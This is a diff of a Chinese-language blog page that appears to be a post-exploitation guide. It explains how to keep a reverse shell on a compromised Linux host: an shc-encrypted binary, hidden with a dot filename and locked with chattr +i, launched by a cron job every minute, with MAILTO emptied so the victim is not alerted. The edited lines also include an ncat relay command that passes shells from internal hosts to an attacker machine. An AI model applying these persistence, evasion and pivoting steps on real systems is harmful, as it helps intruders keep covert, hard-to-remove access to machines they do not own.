@@ -535,9 +535,9 @@
 <p>建议用前面说的shc加密,上传生成的二进制文件,用这个二进制文件弹shell,安全性高一点</p>
 <p>上传之后,先<code>chmod +x 二进制文件</code>给一下权限,然后在名字前面加个<code>.</code>变为隐藏文件(<code>ls -a</code>可以查看隐藏文件),再尝试一下<code>chattr +i 二进制文件</code>(<code>chattr -i 二进制文件</code>可以解除锁定)防止删除,有相应的权限才能成功执行这条命令,最后把这个文件放在安全又隐秘的位置,</p>
 <p>配置cron计划任务时,如果是root用户,那就在/etc/crontab里添加,如果不是root用户,那就用<code>crontab -e</code>添加,注意<code>crontab -e</code>需要交互式shell,理论上来说非root用户的cron存在/var/spool/crond下(CentOS),可以直接编辑相应的文件,但是非root用户通常没有权限直接编辑,所以还是需要获取交互式shell然后<code>crontab -e</code>添加</p>
-<p>/etc/crontab里应该有默认的配置和默认的例子,<code>crontab -e</code>没有,建议使用以下配置:</p>
-<p>在编辑之前先执行<code>$PATH</code>查看环境变量并复制,然后再编辑</p>
-<p>首先第一行<code>SHELL=</code>配置为相应的shell位置,第二行<code>PATH=</code>配置为默认的(如果有的话)加上前面的<code>$PATH</code>,第三行<code>MAILTO=&quot;&quot;</code>,第三行的意义是计划任务的执行结果不给用户发邮件,因为计划任务反弹shell是不停的反弹,但是攻击机如果之前接收到的shell还没关就会报错然后发邮件,发了邮件的话每次执行命令都会提示,很容易就被发现了</p>
+<p>/etc/crontab里应该有默认的配置和默认的例子,<code>crontab -e</code>没有,不管是怎么写cron,都建议使用以下配置:</p>
+<p>在写cron之前先执行<code>$PATH</code>查看环境变量并复制,然后再写cron</p>
+<p>首先第一行配置为<code>SHELL=</code>+相应的shell位置,第二行配置为<code>PATH=</code>+默认的(如果有的话)加上前面的<code>$PATH</code>,第三行配置为<code>MAILTO=&quot;&quot;</code>,第三行的意义是计划任务的执行结果不给用户发邮件,因为计划任务反弹shell是不停的反弹,但是攻击机如果之前接收到的shell还没关就会报错然后发邮件,发了邮件的话每次执行命令都会提示,很容易就被发现了</p>
 <p>最后配置计划任务:</p>
 <p>root用户配置为<code>* * * * * root /要执行的命令或文件</code></p>
 <p>非root用户配置为<code>* * * * * /要执行的命令或文件</code></p>
@@ -565,7 +565,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ncat -l 内网反弹的来的shell的端口 -c <span class="s1">&#39;ncat 攻击机的ip 攻击机的端口&#39;</span>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ncat -l 中转机器接收内网反弹来的shell的端口 -c <span class="s1">&#39;ncat 攻击机的ip 攻击机的端口&#39;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>这样攻击机就可以接收到不出网的设备弹的shell,唯一的缺点就是中转的机器要占用个端口</p>
